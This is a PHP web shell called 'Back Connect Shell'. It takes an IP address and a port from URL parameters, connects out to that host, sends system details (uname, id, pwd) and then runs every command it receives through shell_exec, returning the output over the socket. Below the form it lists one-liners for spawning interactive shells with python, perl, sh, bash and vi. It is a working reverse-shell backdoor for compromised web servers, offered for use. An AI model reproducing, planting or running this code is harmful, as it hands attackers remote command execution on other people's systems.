<?php


ini_set('max_execution_time',0);

?>

<html>
<head><center>
    <title>Back Connect Shell -- PHP</title>
</head>
<style>body{background:black;color:lime;}</style>
<body>

<h1>Back Connect Control</h1>

<?php
if( isset($_GET['port']) &&
    isset($_GET['ip']) && 
    $_GET['port'] != "" &&
    $_GET['ip'] != "" 
    )
    {
        echo "<p>The Program is now trying to connect!</p>";
        $ip = $_GET['ip']; 
        $port=$_GET['port']; 
        $sockfd=fsockopen($ip , $port , $errno, $errstr ); 
        if($errno != 0)
        {
            echo "<font color='red'><b>$errno</b> : $errstr</font>";
        }
        else if (!$sockfd)
        { 
               $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
        } 
        else
        { 
            fputs ($sockfd ,
            "\n=================================================================\n
            Back Connect in PHP\n
            Coded by ./Fake Root
            @@author : ./Fake Root
            @@twitter : twitter.com/f4k3_r00t
            @@Email : bengkulucyberteam@gmail.com
            \n=================================================================");
         $pwd = shell_exec("pwd");
         $sysinfo = shell_exec("uname -a");
         $id = shell_exec("id");
         $dateAndTime = shell_exec("time /t & date /T");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         fputs($sockfd ,$dateAndTime."\n\n" );
         while(!feof($sockfd))
         {  
            $cmdPrompt ="(Shell)[$]> ";
            fputs ($sockfd , $cmdPrompt ); 
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . shell_exec($command) . "\n\n");
         } 
         fclose($sockfd); 
        } 
    }
    else
    {
    ?>
    <table align="center" >
         <form method="GET">
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>IP </td>
                    <td><input style="width: 100px;" name="ip" size='5' value="127.0.0.1"/>
                </tr>
                <tr>
                <td>
                <input style="width: 90px;" class="own" type="submit" value="Connect back :D!"/>
                </td>
                </tr>    
                   
            </table>
         </td>
         </form>
    </tr>
    </table>
    
<?php
    }
?></center>
<br><br><font color="white">SPAWNING SHELLS</font><br><br>Using python :<br>

python -c 'import pty; pty.spawn("/bin/sh")'<br><br>
Echo :
<br>
echo 'os.system('/bin/bash')'<br><br>
sh :<br>

/bin/sh -i<br><br>
bash :<br>

/bin/bash -i<br><br>
Perl :
<br>
perl -e 'exec "/bin/sh";'<br><br>
From within VI :
<br>
:!bash